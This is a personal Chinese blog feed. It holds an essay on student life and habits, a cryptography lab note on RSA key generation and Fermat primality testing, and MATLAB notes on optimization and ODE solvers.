95+，我真的是望其项背。都说分分分，学生的命根。可谁知道我们曾经也是鲜衣怒马的少年，我也想学吉他，弹钢琴，我也想在大学培养兴趣，但现实就是这样赤裸裸的，它告诉你，如果想去更好的学校，你的爱好就要放弃，你只能一心扑在学习上。</p><p>学业，竞赛，科研。我都想抓，但不可能都抓住。我只是个普通人，总要有舍弃，总要有权衡。</p><h1 id="生活？学习？"><a href="#生活？学习？" class="headerlink" title="生活？学习？"></a>生活？学习？</h1><p>西安前一阵子下了半个月的雨，终于晴天，久违的阳光让我恍惚间回到了曾经。</p><p>我好久没有停下脚步看一看这个世界了，这个美好的世界。<br><img src="https://image.hackerjerry.top/Write-in-autumn-1.png#align=left&display=inline&height=449&margin=%5Bobject%20Object%5D&name=IMG_20201017_125701.jpg&originHeight=4624&originWidth=2080&size=8506344&status=done&style=none&width=202" alt="IMG_20201017_125701.jpg"><br>熹微的阳光透过树梢落到地上，斑驳一片，蓝天刚好。</p><p>我问自己，我们努力是为了什么。不就是为了更好的生活吗？为了更好的感知这个世界，为了更优雅的行走。所以何必要让自己如此焦虑？或许我的危机意识过重，我把结果看得太重。</p><p>这两天午后的阳光很好，慵懒地照在阳台上。所以我都选择回宿舍午休，支一把椅子在阳光下，就这样依着，靠着，眯眼休息。这大抵是一天中除了躺在床上外最美好的时光了。为什么要把自己搞得那么累，为什么要把自己逼得那么紧。</p><p>所以我开始思考，如何生活，如何平衡学习和生活。</p><p>每个人的一天都有 24 小时，除去睡觉的 9 个小时以及吃饭的 3 个小时，我们还剩下 12 个小时可以支配。唯一的最优解就是更加专注，提高处理事务的效率，才能省出更多的时间去休息，出去走走，把它们浪费在无用但美好的事情上。<br>大学还剩两年，谈恋爱对于我来说几乎不太可能。</p><h1 id="做出改变"><a href="#做出改变" class="headerlink" title="做出改变"></a>做出改变</h1><p>前几日，比较幸运的拿了国奖，虽然我并没有觉得生活发生了什么改善，但我突然觉得，我应该做出改变了。</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>我的均分一直是我的拉跨项。思维没有从高中转变过来。做事没有精益求精，还时常想当然。</p><h2 id="生活习惯"><a href="#生活习惯" class="headerlink" title="生活习惯"></a>生活习惯</h2><h3 id="睡眠"><a href="#睡眠" class="headerlink" title="睡眠"></a>睡眠</h3><p>首先是早睡。</p><p>晚上回到宿舍，总是浪费大量时间在 b 站等无意义的碎片娱乐上，这和宿舍的整体氛围有很大关系，舍友都在玩，都在看视频，都在大声说话，我不能要求他们，所以我也渐渐同化。但如果我想<strong>早起，</strong>我就必须<strong>早睡</strong>。</p><p>还好我们楼终于开始了熄灯制度，修复了不断电的 bug。（然而，信安协会找到了供电系统的 bug，一个未授权访问的漏洞，一通操作我们宿舍晚上不会断电了……）</p><p>我希望可以做到，熄灯即上床，并将手机放在桌子上，用另一个旧手机当闹钟。</p><h3 id="睡前活动"><a href="#睡前活动" class="headerlink" title="睡前活动"></a>睡前活动</h3><p>因为在 11 点半前我要上床，所以晚上回到宿舍后的每一分钟都很重要。</p><p>有以下几项必须完成：</p><ol><li>洗澡吹头发 or 洗脚（20 分种）</li><li>洗脸（8 分钟）</li><li>刷牙+剔牙（非常重要）（10 分钟）</li><li>手机 ipad 充电（顺手）</li><li>收拾出第二天需要穿的衣物（5 分钟）</li><li>借舍友的锅热牛奶，倒入保温杯（6 分钟），给舍友洗锅（3 分钟）</li></ol><p>大概需要一个小时。</p><h3 id="早起"><a href="#早起" class="headerlink" title="早起"></a>早起</h3><p>上了大学，意志力逐渐消退。从大一 7 点起床，到大二 7 点半，到大三 7 点 45（平时第一节没课的话更晚，8：20 是常态），其实这是因为我每天都 12：30 以后才睡，但其实这么晚睡并没有任何益处，我并没有创造更多的价值，反而损害了健康。</p><p>所以<strong>我决定早起，恢复到大一 7 点的状态。</strong></p><blockquote><p>威林克在海豹突击队服役超过 20 年，退役之后还保持着海豹的作息，他的习惯是每天早上 4：45 起床做事。<br>当费里斯问威林克为什么非得早起，威林克回答说早起能让他有一种心理上战胜敌人的感觉。 威林克觉得世界上的某个地方有个敌人，一手拿着冲锋枪一手拿着手榴弹，等着跟他交锋，所以每天早上一睡醒，他就问自己我现在要做什么，才能为将来那个于敌人交战的时刻做好准备？然后他就起来了，开始一天的锻炼和阅读。</p></blockquote><p><strong>早起不是为了多工作一个小时，而是为了用最好的状态开始清醒的 17 个小时。</strong><br>**<br><strong>高效意味着高产出，高产出意味着积累，积累意味着未来无限的可能性。</strong></p><blockquote><p>这里推荐一篇回答<br>如何不痛苦地早起？ - 王振宇的回答 - 知乎 <a href="https://www.zhihu.com/question/22120300/answer/908708574">https://www.zhihu.com/question/22120300/answer/908708574</a></p></blockquote><p>另外，<strong>我想培养起晨跑的习惯。（春天，夏天，初秋）</strong></p><p><img src="https://image.hackerjerry.top/Write-in-autumn-2.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&name=image.png&originHeight=522&originWidth=828&size=113127&status=done&style=none&width=414" alt="image.png"></p><p><strong>我想成为自己的主人。</strong></p><h3 id="冥想"><a href="#冥想" class="headerlink" title="冥想"></a>冥想</h3><p>其实我之前坚持过一段时间，但不知道为什么就搁置了。<br>我认为每天晚上的 9 点，是最适合冥想的一段时间。</p>]]></content>
    
    
    <categories>
      
      <category>文艺</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCE-Cryptography-Experiment</title>
    <link href="/2020/09/26/SCE-Cryptography-Experiment_new/"/>
    <url>/2020/09/26/SCE-Cryptography-Experiment_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="生成-RSA-大素数对"><a href="#生成-RSA-大素数对" class="headerlink" title="生成 RSA 大素数对"></a>生成 RSA 大素数对</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br>RSAkey = RSA.generate(<span class="hljs-number">1024</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">RsaKey(n=135828718287577504794345019580082927233382329800436650769778319130905210891299413615216512376642256926</span><br><span class="hljs-string">81082083849207511789369113995656114347658628181817364203829151160294408679251739590425386713208320533180799940969738619</span><br><span class="hljs-string">5247179226323919349310987779260954782675652897977451878557940738099185187754664490831243, e=65537, d=121948850024277284</span><br><span class="hljs-string">31419291319547857604730482453358702002370807784400357979224037562169979688178632524487768280722147336522673889062734116</span><br><span class="hljs-string">12091236526264756659745917698038449276833478093929539387457070306648475772351712570431776434737921224077076846006461005</span><br><span class="hljs-string">1801442191171153628914016094739518761772299602223169, p=106966107287469170015624352521638251586863407906376169924940482</span><br><span class="hljs-string">70893593178051022233452907429273165871602433433280712262828660157650519133674850464955099769, q=12698294976981883899887</span><br><span class="hljs-string">05757908736918629112987783691507779835783942064221972829430441724076915068135969878213856988519323444267214248422535888</span><br><span class="hljs-string">1222134150947, u=748951926994679052549581035821877331925827771100922884099976839588394981271357878319645686189368446921</span><br><span class="hljs-string">7133192361022681583376512653412786705315289991596596)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>注意这个 Crypto 库一般情况在导入的时候都会出错，有几种情况，我介绍一下我遇到的，就是我之前安装了 pycrypto 这个库，但是这个库最新的一版是 2014 年，已经不兼容了，当我尝试 uninstall 它时，报错<br><code>ERROR: Cannot uninstall &#39;pycrypto&#39;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</code><br>这时候，我们必须全局搜索 pycrypto，并手动删除那个文件夹<br>然后在<strong>cmd 下</strong>安装<br><code>pip install pycryptodome --user</code></p><blockquote><p>我也不知道为什么必须在 cmd 下安装，一开始用 powershell 安装的时候我在 Python37 文件夹中找不到它…</p></blockquote><h1 id="Fermat-定理检验素数"><a href="#Fermat-定理检验素数" class="headerlink" title="Fermat 定理检验素数"></a>Fermat 定理检验素数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FermatPrimalityTest</span>(<span class="hljs-params">m,k</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    m:给定奇整数</span><br><span class="hljs-string">    k:安全参数，重复K次</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> m%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(k):<br>        a = random.randint(<span class="hljs-number">2</span>,m<span class="hljs-number">-2</span>)<br>        g = gmpy2.gcd(a,m)<br>        <span class="hljs-keyword">if</span> g==<span class="hljs-number">1</span>:<br>            r = gmpy2.powmod(a,m<span class="hljs-number">-1</span>,m)<br>            <span class="hljs-keyword">if</span> r ==<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unconstrained-Optimization</title>
    <link href="/2020/09/14/Unconstrained-Optimization_new/"/>
    <url>/2020/09/14/Unconstrained-Optimization_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="无约束优化"><a href="#无约束优化" class="headerlink" title="无约束优化"></a>无约束优化</h1><h2 id="单变量优化-最小值"><a href="#单变量优化-最小值" class="headerlink" title="单变量优化(最小值)"></a>单变量优化(最小值)</h2><h3 id="fminbnd’命令–查找单变量函数在定区间上的最小值"><a href="#fminbnd’命令–查找单变量函数在定区间上的最小值" class="headerlink" title="`fminbnd’命令–查找单变量函数在定区间上的最小值"></a>`fminbnd’命令–查找单变量函数在定区间上的最小值</h3><p><code>x = fminbnd(fun,x1,x2)</code> 返回一个值 x，该值是 fun 中描述的标量值函数在区间 x1 &lt; x &lt; x2 中的局部最小值。<br><code>x = fminbnd(fun,x1,x2,options)</code> 如 options = optimset(‘Display’,’iter’)在常微分方程中有详细的描述<br><code>x = fminbnd(problem)</code><br><code>[x,fval] = fminbnd(___)</code> 返回目标函数在 fun 的解 x 处计算出的值。</p><blockquote><p>即求最小值的位置和函数值</p></blockquote><p>如</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab">fun = @<span class="hljs-built_in">sin</span>;<br>[x,fval] = fminbnd(fun,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>)<br><span class="hljs-comment">%输出</span><br>x = <span class="hljs-number">4.7124</span><br>fval = <span class="hljs-number">-1.0000</span><br></code></pre></td></tr></table></figure><p><code>[x,fval,exitflag] = fminbnd(___)</code><br><code>[x,fval,exitflag,output] = fminbnd(___)</code></p><h2 id="双变量优化-最小值"><a href="#双变量优化-最小值" class="headerlink" title="双变量优化(最小值)"></a>双变量优化(最小值)</h2><h3 id="fminunc信赖域法和拟牛顿法"><a href="#fminunc信赖域法和拟牛顿法" class="headerlink" title="fminunc信赖域法和拟牛顿法"></a><code>fminunc</code>信赖域法和拟牛顿法</h3><p><code>x = fminunc(fun,x0)</code><br><code>x = fminunc(fun,x0,options)</code><br><code>x = fminunc(problem)</code><br><code>[x,fval] = fminunc(___)</code><br><code>[x,fval,exitflag,output] = fminunc(___)</code><br><code>[x,fval,exitflag,output,grad,hessian] = fminunc(___)</code><br>这里看一个<strong>双变量加传参的特殊例子</strong>。求<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span> = <span class="hljs-title">examfminunc</span><span class="hljs-params">(x,a,b)</span></span><br>x = x(<span class="hljs-number">1</span>)^<span class="hljs-number">2</span>/a+x(<span class="hljs-number">2</span>)^<span class="hljs-number">2</span>/b;<br></code></pre></td></tr></table></figure><p>源程序<code>x = fminunc(@examfminunc,[1,1],[],2,2)%x=1,y=1是初始值</code></p><blockquote><p>我也不知道这是怎么传进去的参……这个顺序就很迷，但去掉那个[]就会报错无法执行赋值，因为此类型的变量不支持使用点进行索引后期在看书的时候发现那里似乎是 opt 字段，传空数组即不对 opt 进行修改于是我尝试修改成 <code>x = fminunc(@examfminunc,[1,1],&#39;&#39;,2,2)</code>，发现果然也能运行</p></blockquote><h2 id="lsqnonlin-拟合非线性最小二乘系数"><a href="#lsqnonlin-拟合非线性最小二乘系数" class="headerlink" title="lsqnonlin 拟合非线性最小二乘系数"></a><code>lsqnonlin</code> 拟合非线性最小二乘系数</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>x = lsqnonlin(fun,x0)</code><br><code>x = lsqnonlin(fun,x0,lb,ub)</code> defines a set of lower and upper bounds on the design variables in x, so that the solution is always in the range . You can fix the solution component x(i) by specifying .<br><code>x = lsqnonlin(fun,x0,lb,ub,options)</code><br>主要用于最小二乘法寻找最优点。（直接把函数值传进去寻找最小值）</p><p><img src="https://image.hackerjerry.top/Unconstrained-Optimization-1.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&originHeight=88&originWidth=565&size=0&status=done&style=none&width=565"></p><h3 id="示例：飞机定位"><a href="#示例：飞机定位" class="headerlink" title="示例：飞机定位"></a>示例：飞机定位</h3><p>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span> = <span class="hljs-title">feijidingwei</span><span class="hljs-params">(x,x0,y0,theta,sigma,d4,sigma4)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">3</span><br>    f(<span class="hljs-built_in">i</span>) = (<span class="hljs-built_in">atan2</span>(x(<span class="hljs-number">1</span>)-x0(<span class="hljs-built_in">i</span>),x(<span class="hljs-number">2</span>)-y0(<span class="hljs-built_in">i</span>))-theta(<span class="hljs-built_in">i</span>))/sigma(<span class="hljs-built_in">i</span>);<span class="hljs-comment">%最小二乘的1~3个参数（注意没有平方，lsqcurvefit函数会加上）</span><br><span class="hljs-keyword">end</span><br>f(<span class="hljs-number">4</span>) = (<span class="hljs-built_in">sqrt</span>((x(<span class="hljs-number">1</span>)-x0(<span class="hljs-number">4</span>))^<span class="hljs-number">2</span>+(x(<span class="hljs-number">2</span>)-y0(<span class="hljs-number">4</span>))^<span class="hljs-number">2</span>)-d4)/sigma4;<span class="hljs-comment">%最小二乘的第四个参数</span><br>主程序<br>X = [<span class="hljs-number">746</span> <span class="hljs-number">629</span> <span class="hljs-number">1571</span> <span class="hljs-number">155</span>];<br>Y = [<span class="hljs-number">1393</span> <span class="hljs-number">375</span> <span class="hljs-number">259</span> <span class="hljs-number">987</span>];<br>theta = [<span class="hljs-number">161.2</span>,<span class="hljs-number">45.1</span>,<span class="hljs-number">309.0</span><span class="hljs-number">-360</span>]*<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>/<span class="hljs-number">360</span>;<br>sigma = [<span class="hljs-number">0.8</span>,<span class="hljs-number">0.6</span>,<span class="hljs-number">1.3</span>]*<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>/<span class="hljs-number">360</span>;<br>d4 = <span class="hljs-number">864.3</span>;<br>sigma4 = <span class="hljs-number">2</span>;<br>x0 = [<span class="hljs-number">900</span>,<span class="hljs-number">700</span>];<span class="hljs-comment">%大约估计的飞机位置</span><br>[x,norm,res,exit,out] = lsqnonlin(@feijidingwei,x0,[],[],[],X,Y,theta,sigma,d4,sigma4)<span class="hljs-comment">%注意这里主初始值就是x0，然后接着三个空数组，然后才能把额外参数传进来</span><br><span class="hljs-comment">%输出</span><br>x =<br><br>   <span class="hljs-number">1.0e+02</span> *<br><br>   <span class="hljs-number">9.783070295413857</span>   <span class="hljs-number">7.239837766517786</span><br><br><br>norm =<br><br>   <span class="hljs-number">0.668471174541973</span><br></code></pre></td></tr></table></figure><blockquote><p>lsqcurvefit 也可以最小二乘但是尝试了许多方法它都无法传入更多的参数……遂放弃</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>matlab</tag>
      
      <tag>无约束优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Differential-Equations</title>
    <link href="/2020/09/10/Differential-Equations_new/"/>
    <url>/2020/09/10/Differential-Equations_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="非刚性常微分方程"><a href="#非刚性常微分方程" class="headerlink" title="非刚性常微分方程"></a>非刚性常微分方程</h1><p>形如类的方程,反求出 y 的值,并最终画出原函数图像</p><h2 id="ode23-–-求解非刚性微分方程-低阶方法"><a href="#ode23-–-求解非刚性微分方程-低阶方法" class="headerlink" title="ode23 – 求解非刚性微分方程 - 低阶方法"></a>ode23 – 求解非刚性微分方程 - 低阶方法</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>[t,y] = ode23(odefun,tspan,y0)</code><br><code>[t,y] = ode23(odefun,tspan,y0,options)</code><br><code>[t,y,te,ye,ie] = ode23(odefun,tspan,y0,options)</code><br><code>sol = ode23(___)</code></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><code>[t,y] = ode23(odefun,tspan,y0)</code>（其中 tspan = [t0 tf]）求微分方程组 从 到 的积分，初始条件为 。<strong>解数组 中的每一行都与列向量 中返回的值相对应。</strong>,必须返回矩阵才能一一对应!<br><strong>参数</strong><code>odefun</code><br><strong>要求解的函数，指定为指向待积分函数的句柄。</strong><br>对于标量 t 和列向量 y 来说，函数 dydt = odefun(t,y) 必须返回数据类型为 single 或 double 的列向量 dydt，该列向量对应于 f(t,y)。odefun 必须同时接受输入参数 t 和 y，即使其中一个参数未在函数中使用也是如此。<br>例如，要解算 y′=5y−3，请使用此函数：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y)</span></span><br>dydt = <span class="hljs-number">5</span>*y<span class="hljs-number">-3</span>;<br></code></pre></td></tr></table></figure><p>对于方程组，odefun 的输出为向量。向量中的每个元素是一个方程的解。例如，要求解<br><img src="https://image.hackerjerry.top/Differential-Equations-1.svg#card=math&code=y%E2%80%B2_1%3Dy_1%2B2y_2%0A%0A&height=18&width=103"><br><img src="https://image.hackerjerry.top/Differential-Equations-2.svg#card=math&code=y%E2%80%B2_2%3D3y_1%2B2y_2&height=18&width=112"></p><p>使用函数：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y)</span></span><br>dydt = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<br>dydt(<span class="hljs-number">1</span>) = y(<span class="hljs-number">1</span>)+<span class="hljs-number">2</span>*y(<span class="hljs-number">2</span>);<br>dydt(<span class="hljs-number">2</span>) = <span class="hljs-number">3</span>*y(<span class="hljs-number">1</span>)+<span class="hljs-number">2</span>*y(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><div class="note note-important">            <p>tspan</p>          </div><p><strong>积分区间，指定为向量。</strong>tspan 必须至少是一个二元素向量 [t0 tf]，用于指定初始时间和最终时间。要获取 t0 到 tf 之间的特定时间的解，请使用 [t0,t1,t2,…,tf] 形式的长向量。tspan 中的元素必须单调递增或单调递减。<br>求解器在初始时间 tspan(1) 施加由 y0 给出的初始条件，然后求 tspan(1) 到 tspan(end) 的积分：<br>如果 tspan 有两个元素，[t0 tf]，求解器将返回在该区间内的每个内部积分步计算的解。<br>如果 tspan 包含两个以上的元素，[t0,t1,t2,…,tf]，求解器将返回在给定点处计算的解。但是，求解器不会精确步进到 tspan 中指定的每个点。此时，求解器使用自己的内部积分步来计算解，然后在 tspan 中请求的各点处计算解。在指定点处生成的解与在每个内部积分步计算的解具有相同的准确度级别。示例</p><p><img src="https://image.hackerjerry.top/Differential-Equations-3.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&originHeight=279&originWidth=801&size=0&status=done&style=none&width=801"></p><h4 id="对于二阶非刚性-ODE-方程"><a href="#对于二阶非刚性-ODE-方程" class="headerlink" title="对于二阶非刚性 ODE 方程"></a>对于二阶非刚性 ODE 方程</h4><p>如$y_1’’- (1-y_1^2)*y_1’+y_1=0$,这是一个<code>van der Pol </code>方程.<br>二阶方程做一阶变换<br>令$y_2=y_1’$,因此$y_2’=(1-y_1^2)*y_2+y_1$<br>类似的对应关系<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724217-10c4acb3-9586-46a1-a955-b4fbc0909460.png#align=left&display=inline&height=346&margin=%5Bobject%20Object%5D&originHeight=346&originWidth=744&size=0&status=done&style=none&width=744"><br>具体 matlab 实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%vdp1.m文件</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">vdp1</span><span class="hljs-params">(t,y)</span></span><br>dydt = [y(<span class="hljs-number">2</span>); (<span class="hljs-number">1</span>-y(<span class="hljs-number">1</span>)^<span class="hljs-number">2</span>)*y(<span class="hljs-number">2</span>)-y(<span class="hljs-number">1</span>)];<span class="hljs-comment">%将方程两边作为二维矩阵的两个行向量</span><br></code></pre></td></tr></table></figure><p>使用 ode23 函数、时间区间 [0 20] 和初始值 [2 ; 0]来解算该 ODE。生成的输出即为时间点 t 的列向量和解数组 y。y 中的每一行都与 t 的相应行中返回的时间相对应。y 的第一列与 相对应，第二列与 相对应。</p><blockquote><p>虽然初始值是上下排列,但最后得到的数据是左右排列(一列是对应一个 y,感觉好像转置了)</p></blockquote><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">[t,y] = ode23(@vdp1,[<span class="hljs-number">0</span> <span class="hljs-number">20</span>],[<span class="hljs-number">2</span>; <span class="hljs-number">0</span>]);<span class="hljs-comment">%使用@文件名可以调用里面的函数(最好文件名和函数名一致)</span><br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-o&#x27;</span>)<span class="hljs-comment">%绘制y1和y2的解图</span><br>title(<span class="hljs-string">&#x27;Solution of van der Pol Equation (\mu = 1) with ODE23&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;Time t&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Solution y&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;y_1&#x27;</span>,<span class="hljs-string">&#x27;y_2&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>注意</strong><br><code>ode23 </code>仅适用于使用两个输入参数（t 和 y）的函数。但是，通过在函数外部定义参数并在指定函数句柄时传递这些参数，可以传入额外参数。</p><h5 id="传入额外参数"><a href="#传入额外参数" class="headerlink" title="传入额外参数"></a>传入额外参数</h5><p>解$y’’=\frac{A}{B}ty$<br>重写令$y_1’=y_2$,因此$y_2’=\frac{A}{B}ty_1$<br>函数文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dydt</span> = <span class="hljs-title">odefun</span><span class="hljs-params">(t,y,a,b)</span></span><br>dydt = [y(<span class="hljs-number">2</span>);(a/b)*t.*y(<span class="hljs-number">1</span>)]<br></code></pre></td></tr></table></figure><p>调用文件</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab">A = <span class="hljs-number">1</span>;<br>B = <span class="hljs-number">2</span>;<br>tspan = [<span class="hljs-number">0</span> <span class="hljs-number">5</span>];<br>y0 = [<span class="hljs-number">0</span>;<span class="hljs-number">0.01</span>];<br>[t,y] = ode23(@(t,y) odefun(t,y,A,B), tspan, y0);<br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者一个文件试了一下也是可以的</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs matlab">odefun = @(t,y,a,b)[y(<span class="hljs-number">2</span>);(a/b)*t.*y(<span class="hljs-number">1</span>)];<br>A = <span class="hljs-number">1</span>;<br>B = <span class="hljs-number">2</span>;<br>tspan = [<span class="hljs-number">0</span> <span class="hljs-number">5</span>];<br>y0 = [<span class="hljs-number">0</span>;<span class="hljs-number">0.01</span>];<br>[t,y] = ode23(@(t,y) odefun(t,y,A,B), tspan, y0);<br><span class="hljs-built_in">plot</span>(t,y(:,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;-o&#x27;</span>,t,y(:,<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;-.&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/Differential-Equations-4.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&originHeight=411&originWidth=546&size=0&status=done&style=none&width=546"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>ode23</code> 是<code> Bogacki</code> 和 <code>Shampine </code>的显式 <code>Runge-Kutta (2,3)</code> 对的实现。在容差较宽松且刚度适中的情况下，它可能比 <code>ode45</code> 更加有效。<code>ode23 </code>是单步求解器</p><h2 id="ode45-–-求解非刚性微分方程-中阶方法"><a href="#ode45-–-求解非刚性微分方程-中阶方法" class="headerlink" title="ode45 – 求解非刚性微分方程 - 中阶方法"></a>ode45 – 求解非刚性微分方程 - 中阶方法</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><code>[t,y] = ode45(odefun,tspan,y0)</code><br><code>[t,y] = ode45(odefun,tspan,y0,options)</code><br><code>[t,y,te,ye,ie] = ode45(odefun,tspan,y0,options)</code><br><code>sol = ode45(___)</code><br><strong>ode45 是一个通用型 ODE 求解器，是解算大多数问题时的首选。但是，对于刚性问题或需要较高准确性的问题，其他 ODE 求解器可能更适合。</strong><br>其实用法和 ode23 几乎一样,只是生成的数据图的数据点更密了.<br><img src="https://image.hackerjerry.top/Differential-Equations-5.png#align=left&display=inline&height=492&margin=%5Bobject%20Object%5D&originHeight=492&originWidth=612&size=0&status=done&style=none&width=612"></p><h1 id="刚性常微分方程"><a href="#刚性常微分方程" 